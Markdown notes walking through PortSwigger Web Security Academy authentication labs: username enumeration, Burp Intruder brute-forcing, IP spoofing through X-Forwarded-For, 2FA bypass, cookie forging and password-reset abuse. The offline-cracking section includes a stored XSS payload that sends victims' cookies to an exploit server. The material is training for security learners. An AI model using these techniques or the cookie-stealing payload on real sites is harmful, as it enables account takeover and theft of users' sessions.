<!-- omit in toc -->
# Authentication

<!-- omit in toc -->
## Table of Contents

- [Username enumeration via different responses](#username-enumeration-via-different-responses)
- [Username enumeration via subtly different responses](#username-enumeration-via-subtly-different-responses)
- [Username enumeration via response timing](#username-enumeration-via-response-timing)
- [Broken brute-force protection, IP block](#broken-brute-force-protection-ip-block)
- [Username enumeration via account lock](#username-enumeration-via-account-lock)
- [2FA simple bypass](#2fa-simple-bypass)
- [2FA broken logic](#2fa-broken-logic)
- [Brute-forcing a stay-logged-in cookie](#brute-forcing-a-stay-logged-in-cookie)
- [Offline password cracking](#offline-password-cracking)
- [Password reset broken logic](#password-reset-broken-logic)

## Username enumeration via different responses
Reference: https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses

<!-- omit in toc -->
### Quick Solution
This lab allows username enumeration and password bruteforce. When the username is wrong the error message is ``Invalid Username`` while when the password is wrong the error message is ``Incorrect password``. Given the wordlist of usernames and passwords it is quite easy to solve.

<!-- omit in toc -->
### Solution
1. With Burp running, investigate the login page and submit an invalid username and password.
2. In Burp, go to Proxy > HTTP history and find the ``POST /login`` request. Send this to Burp Intruder.
3. In Burp Intruder, go to the Positions tab. Make sure that the Sniper attack type is selected.
4. Click Clear § to remove any automatically assigned payload positions. Highlight the value of the username parameter and click Add § to set it as a payload position. This position will be indicated by two § symbols, for example: ``username=§invalid-username§``. Leave the password as any static value for now.
5. On the Payloads tab, make sure that the Simple list payload type is selected.
6. Under Payload options, paste the list of candidate usernames. Finally, click Start attack. The attack will start in a new window.
7. When the attack is finished, on the Results tab, examine the Length column. You can click on the column header to sort the results. Notice that one of the entries is longer than the others. Compare the response to this payload with the other responses. Notice that other responses contain the message ``Invalid username``, but this response says ``Incorrect password``. Make a note of the username in the Payload column.
8. Close the attack and go back to the Positions tab. Click Clear, then change the ``username`` parameter to the username you just identified. Add a payload position to the `password` parameter. The result should look something like this:
```
username=identified-user&password=§invalid-password§
```
9. On the Payloads tab, clear the list of usernames and replace it with the list of candidate passwords. Click Start attack.
10. When the attack is finished, look at the Status column. Notice that each request received a response with a ``200`` status code except for one, which got a ``302`` response. This suggests that the login attempt was successful - make a note of the password in the Payload column.
11. Log in using the username and password that you identified and access the user account page to solve the lab.

## Username enumeration via subtly different responses
Reference: https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-subtly-different-responses

<!-- omit in toc -->
### Quick Solution
In this case the message is generic when the username and/or the password are wrong. But there is a subtle difference between the case when both are wrong and only the password is wrong (``Invalid username or password.`` vs ``Invalid username or passowrd``). Using this difference the username can be enumerated and then the password for that user can be easily bruteforced.

<!-- omit in toc -->
### Solution
1. With Burp running, submit an invalid username and password. Send the ``POST /login`` request to Burp Intruder and add a payload position to the ``username`` parameter.
2. On the Payloads tab, make sure that the Simple list payload type is selected and add the list of candidate usernames.
3. On the Options tab, under Grep - Extract, click Add. In the dialog that appears, scroll down through the response until you find the error message ``Invalid username or password..`` Use the mouse to highlight the text content of the message. The other settings will be automatically adjusted. Click OK and then start the attack.
4. When the attack is finished, notice that there is an additional column containing the error message you extracted. Sort the results using this column to notice that one of them is subtly different.
5. Look closer at this response and notice that it contains a typo in the error message - instead of a full stop/period, there is a trailing space. Make a note of this username.
6. Close the attack and go back to the Positions tab. Insert the username you just identified and add a payload position to the ``password`` parameter:
```
username=identified-user&password=§invalid-password§
```
7. On the Payloads tab, clear the list of usernames and replace it with the list of passwords. Start the attack.
8. When the attack is finished, notice that one of the requests received a ``302`` response. Make a note of this password.
9. Log in using the username and password that you identified and access the user account page to solve the lab.

## Username enumeration via response timing
Reference: https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing

<!-- omit in toc -->
### Quick Solution
This lab is a little bit tricky. The IP is blocked if too many requyests are made. To overcome this issue the ``X-Forwarded-For`` header can be used to spoof the IP address. Using a ``Pitchfork`` attack the right username can be retrieved looking at the time response. Once we found the username we can easily bruteforce the password.

<!-- omit in toc -->
### Solution
1. With Burp running, submit an invalid username and password, then send the ``POST /login`` request to Burp Repeater. Experiment with different usernames and passwords. Notice that your IP will be blocked if you make too many invalid login attempts.
2. Identify that the ``X-Forwarded-For`` header is supported, which allows you to spoof your IP address and bypass the IP-based brute-force protection.
3. Continue experimenting with usernames and passwords. Pay particular attention to the response times. Notice that when the username is invalid, the response time is roughly the same. However, when you enter a valid username (your own), the response time is increased depending on the length of the password you entered.
4. Send this request to Burp Intruder and select the attack type to Pitchfork. Clear the default payload positions and add the ``X-Forwarded-For`` header.
5. Add payload positions for the ``X-Forwarded-For`` header and the ``username`` parameter. Set the password to a very long string of characters (about 100 characters should do it).
6. On the Payloads tab, select payload set 1. Select the Numbers payload type. Enter the range 1 - 100 and set the step to 1. Set the max fraction digits to 0. This will be used to spoof your IP.
7. Select payload set 2 and add the list of usernames. Start the attack.
8. When the attack finishes, at the top of the dialog, click Columns and select the Response received and Response completed options. These two columns are now displayed in the results table.
9. Notice that one of the response times was significantly longer than the others. Repeat this request a few times to make sure it consistently takes longer, then make a note of this username.
10. Create a new Burp Intruder attack for the same request. Add the ``X-Forwarded-For`` header again and add a payload position to it. Insert the username that you just identified and add a payload position to the ``password`` parameter.
11. On the Payloads tab, add the list of numbers in payload set 1 and add the list of passwords to payload set 2. Start the attack.
12. When the attack is finished, find the response with a ``302`` status. Make a note of this password.
13. Log in using the username and password that you identified and access the user account page to solve the lab.

## Broken brute-force protection, IP block
Reference: https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block

<!-- omit in toc -->
### Solution
1. With Burp running, investigate the login page. Observe that your IP is temporarily blocked if you submit 3 incorrect logins in a row. However, notice that you can reset the counter for the number of failed login attempts by logging in to your own account before this limit is reached.
2. Enter an invalid username and password, then send the ``POST /login`` request to Burp Intruder. Create a pitchfork attack with payload positions in both the ``username`` and ``password`` parameters.
3. On the Payloads tab, select payload set 1. Add a list of payloads that alternates between your username and ``carlos``. Make sure that your username is first and that ``carlos`` is repeated at least 100 times.
4. Edit the list of candidate passwords and add your own password before each one. Make sure that your password is aligned with your username in the other list.
5. Add this list to payload set 2 and start the attack.
6. When the attack finishes, filter the results to hide responses with a 200 status code. Sort the remaining results by username. There should only be a single 302 response for requests with the username ``carlos``. Make a note of the password from the Payload 2 column.
7. Log in to Carlos's account using the password that you identified and access his account page to solve the lab.

## Username enumeration via account lock
Reference: https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-account-lock

<!-- omit in toc -->
### Quick Solution
This website locks an account if it receives to many login attempts. This feature can be used to retrieve the ``username`` of a valid user. Once we found the username we can try to bruteforce the password; even if th web app locks the account when trying with the right credentials there is no error message. Wait for one minute and then login.

<!-- omit in toc -->
### Solution
1. With Burp running, investigate the login page and submit an invalid username and password. Send the ``POST /login`` request to Burp Intruder.
2. Select the attack type Cluster bomb. Add a payload position to the ``username`` parameter. Add a blank payload position to the end of the request body by clicking Add § twice. The result should look something like this:
```
username=§invalid-username§&password=example§§
```
3. On the Payloads tab, add the list of usernames to the first payload set. For the second set, select the Null payloads type and choose the option to generate 5 payloads. This will effectively cause each username to be repeated 5 times. Start the attack.
4. In the results, notice that the responses for one of the usernames were longer than responses when using other usernames. Study the response more closely and notice that it contains a different error message: ``You have made too many incorrect login attempts``. Make a note of this username.
5. Create a new Burp Intruder attack on the ``POST /login`` request, but this time select the Sniper attack type. Set the ``username`` parameter to the username that you just identified and add a payload position to the ``password`` parameter.
6. Add the list of passwords to the payload set and create a grep extraction rule for the error message. Start the attack.
7. In the results, look at the grep extract column. Notice that there are a couple of different error messges, but one of the responses did not contain any error message. Make a note of this password.
8. Wait for a minute to allow the account lock to reset. Log in using the username and password that you identified and access the user account page to solve the lab.

## 2FA simple bypass
Reference: https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-simple-bypass

<!-- omit in toc -->
### Solution
1. Log in to your own account. Your 2FA verification code will be sent to you by email. Click the **Email client** button to access your emails.
2. Go to your account page and make a note of the URL.
3. Log out of your account.
4. Log in using the victim's credentials.
5. When prompted for the verification code, manually change the URL to navigate to ``/my-account``. The lab is solved when the page loads.

## 2FA broken logic
Reference: https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic

<!-- omit in toc -->
### Quick Solution
First make sure a MFA-code verification code is generated for user ``carlos`` by issuing a GET request to ``login2``, then bruteforce the POST request to ``login2`` using the *Payload type: Brute forcer*.

<!-- omit in toc -->
### Solution
1. With Burp running, log in to your own account and investigate the 2FA verification process. Notice that in the ``POST /login2`` request, the ``verify`` parameter is used to determine which user's account is being accessed.
2. Log out of your account.
3. Send the ``GET /login2`` request to Burp Repeater. Change the value of the ``verify`` parameter to ``carlos`` and send the request. This ensures that a temporary 2FA code is generated for Carlos.
4. Go to the login page and enter your username and password. Then, submit an invalid 2FA code.
5. Send the ``POST /login2`` request to Burp Intruder.
6. In Burp Intruder, set the ``verify`` parameter to ``carlos`` and add a payload position to the mfa-code parameter. Brute-force the verification code.
7. Load the 302 response in your browser.
8. Click My account to solve the lab.

## Brute-forcing a stay-logged-in cookie
Reference: https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie

<!-- omit in toc -->
### Quick Solution
The **Stay logged in** cookie is constructed as follows:
```
base64(username+':'+md5HashOfPassword)
```
So it can be easily bruteforced.

<!-- omit in toc -->
### Solution
1. With Burp running, log in to your own account with the Stay logged in option selected. Notice that this sets a ``stay-logged-in`` cookie.
2. Examine this cookie in the Inspector panel and notice that it is Base64-encoded. Its decoded value is ``wiener:51dc30ddc473d43a6011e9ebba6ca770``. Study the length and character set of this string and notice that it could be an MD5 hash. Given that the plaintext is your username, you can make an educated guess that this may be a hash of your password. Hash your password using MD5 to confirm that this is the case. We now know that the cookie is constructed as follows:
```
base64(username+':'+md5HashOfPassword)
```
3. Log out of your account.
4. Send the most recent ``GET /my-account`` request to Burp Intruder.
5. In Burp Intruder, add a payload position to the ``stay-logged-in`` cookie and add your own password as a single payload.
6. Under Payload processing, add the following rules in order. These rules will be applied sequentially to each payload before the request is submitted.
- Hash: ``MD5``
- Add prefix: ``wiener:``
- Encode: ``Base64-encode``
7. As the Update email button is only displayed when you access the ``/my-account`` page in an authenticated state, we can use the presence or absence of this button to determine whether we've successfully brute-forced the cookie. On the Options tab, add a grep match rule to flag any responses containing the string ``Update email``. Start the attack.
8. Notice that the generated payload was used to successfully load your own account page. This confirms that the payload processing rules work as expected and you were able to construct a valid cookie for your own account.
9. Make the following adjustments and then repeat this attack:
- Remove your own password from the payload list and add the list of candidate passwords instead.
- Change the Add prefix rule to add ``carlos:`` instead of ``wiener:``.
10. When the attack is finished, the lab will be solved. Notice that only one request returned a response containing ``Update email``. The payload from this request is the valid ``stay-logged-in`` cookie for Carlos's account.

## Offline password cracking
Reference: https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking

<!-- omit in toc -->
### Solution
1. With Burp running, use your own account to investigate the "Stay logged in" functionality. Notice that the ``stay-logged-in`` cookie is Base64 encoded.
2. In the Proxy > HTTP history tab, go to the Response to your login request and highlight the ``stay-logged-in`` cookie, to see that it is constructed as follows:
```
username+':'+md5HashOfPassword
```
3. You now need to steal the victim user's cookie. Observe that the comment functionality is vulnerable to XSS.
4. Go to the exploit server and make a note of the URL.
5. Go to one of the blogs and post a comment containing the following stored XSS payload, remembering to enter your own exploit server ID:
```
<script>document.location='//your-exploit-server-id.web-security-academy.net/'+document.cookie</script>
```
6. On the exploit server, open the access log. There should be a GET request from the victim containing their ``stay-logged-in`` cookie.
7. Decode the cookie in Burp Decoder. The result will be:
```
carlos:26323c16d5f4dabff3bb136f2460a943
```
8. Copy the hash and paste it into a search engine. This will reveal that the password is ``onceuponatime``.
9. Log in to the victim's account, go to the "My account" page, and delete their account to solve the lab.

## Password reset broken logic
Reference: https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic

<!-- omit in toc -->
### Quick Solution
This lab has a vulnerable password reset functionality. The link received by email is **reusable** and can also target every user just by changing the ``username`` parameter.

<!-- omit in toc -->
### Solution
1. With Burp running, click the Forgot your password? link and enter your own username.
2. Click the Email client button to view the password reset email that was sent. Click the link in the email and reset your password to whatever you want.
3. In Burp, go to Proxy > HTTP history and study the requests and responses for the password reset functionality. Observe that the reset token is provided as a URL query parameter in the reset email. Notice that when you submit your new password, the ``POST /forgot-password?temp-forgot-password-token`` request contains the username as hidden input. Send this request to Burp Repeater.
4. In Burp Repeater, observe that the password reset functionality still works even if you delete the value of the ``temp-forgot-password-token parameter`` in both the URL and request body. This confirms that the token is not being checked when you submit the new password.
5. In your browser, request a new password reset and change your password again. Send the ``POST /forgot-password?temp-forgot-password-token`` request to Burp Repeater again.
6. In Burp Repeater, delete the value of the ``temp-forgot-password-token`` parameter in both the URL and request body. Change the ``username`` parameter to ``carlos``. Set the new password to whatever you want and send the request.
7. In your browser, log in to Carlos's account using the new password you just set. Click My account to solve the lab.